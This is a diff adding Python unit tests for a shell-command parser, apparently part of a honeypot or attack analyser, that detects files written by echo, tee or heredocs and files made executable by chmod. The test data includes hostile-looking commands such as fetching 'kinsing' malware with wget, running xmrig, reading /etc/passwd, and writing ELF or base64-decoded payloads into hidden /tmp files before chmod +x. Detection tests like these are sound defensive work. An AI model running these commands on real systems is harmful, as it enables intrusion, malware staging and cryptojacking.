@@ -7,6 +7,8 @@ from brain.commands import (
     pipes_to_shell,
     segments,
     tool_names,
+    written_files,
+    chmodded_executable,
     urls,
 )
 
@@ -59,3 +61,22 @@ def test_tool_names():
     assert "xmrig" in tool_names("./xmrig --donate-level 1")
     assert "kinsing" in tool_names("wget http://a.b/kinsing")
     assert tool_names("ls -la; cat /etc/passwd; uname -a") == []
+
+
+def test_written_files():
+    assert written_files("echo -ne '\x7fELF' > /tmp/.d") == ["/tmp/.d"]
+    assert written_files("printf 'a' >> .x") == [".x"]
+    assert written_files("echo f0VMRgI= | base64 -d > /tmp/k") == ["/tmp/k"]
+    assert written_files("echo 'a > b' | tee -a run.sh /tmp/two") == ["run.sh", "/tmp/two"]
+    assert written_files("cat > \"/tmp/s p\" << EOF") == ["/tmp/s p"]
+    # not writes: other commands, stderr, /dev, base64 encoding
+    assert written_files("uname -a > /dev/null 2> err.log") == []
+    assert written_files("ls > files.txt") == []
+    assert written_files("echo hi | base64 > enc.txt") == []
+    assert written_files("echo 'x > y'") == []
+
+
+def test_chmodded_executable():
+    assert chmodded_executable("chmod +x /tmp/.d") == [".d"]
+    assert chmodded_executable("chmod 755 a b; chmod u+x c") == ["a", "b", "c"]
+    assert chmodded_executable("chmod 644 a; chmod -x b; chmod +r c") == []
